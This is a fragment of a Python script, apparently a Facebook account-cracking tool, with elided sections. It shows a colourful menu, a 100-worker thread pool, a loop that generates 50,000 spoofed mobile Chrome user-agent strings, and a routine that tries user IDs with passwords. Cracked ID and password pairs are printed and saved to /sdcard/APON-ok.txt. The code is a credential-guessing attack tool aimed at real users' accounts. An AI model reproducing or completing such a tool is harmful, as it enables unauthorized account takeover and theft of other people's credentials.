...
def sykology():
    ...
    print(logo)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=XD(APON)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    ...
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=XD(APON)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m[XD𝟎𝟏] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑴")
    print(" \033[38;5;46m[XD𝟎𝟐] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑴𝑩𝑨𝑺𝑰𝑪")
    print(" \033[38;5;46m[XD𝟎𝟑] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑷𝑭𝑹𝑬𝑬")
    print(" \033[38;5;46m[XD𝟎𝟒] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑷")
    print(" \033[38;5;46m[XD𝟎𝟓] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑿")
    print(" \033[38;5;46m[XD𝟎𝟔] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑻𝑶𝑼𝑪𝑯") 
    print(" \033[38;5;46m=============================")
    line()
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(APON))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mAPON-ok.txt") 
...
for xd in range(50000):
    ...
    l=' Chrome/87.0.4280.66 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def random_subb(uid,pwx,fb,fb1):
    global oks,cps,ugen,loop
    sys.stdout.write(f"\r\033[38;5;46m[✮⃝APON𝄟⃝✔️ ᴠͥɪͣᴘͫ] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 𝙀𝙈𝙍𝘼𝙉\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m        𝔸ℙ𝕆ℕ 𝔽𝔸ℂ𝔼𝔹𝕆𝕆𝕂\033[38;5;46m❴ℕ𝕌𝕄𝔹𝔼ℝ❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m        𝔸ℙ𝕆ℕ 𝔽𝔸ℂ𝔼𝔹𝕆𝕆𝕂\033[38;5;46m❴ℙ𝔸𝕊𝕊𝕎𝕆ℝ𝔻❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open("/sdcard/APON-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
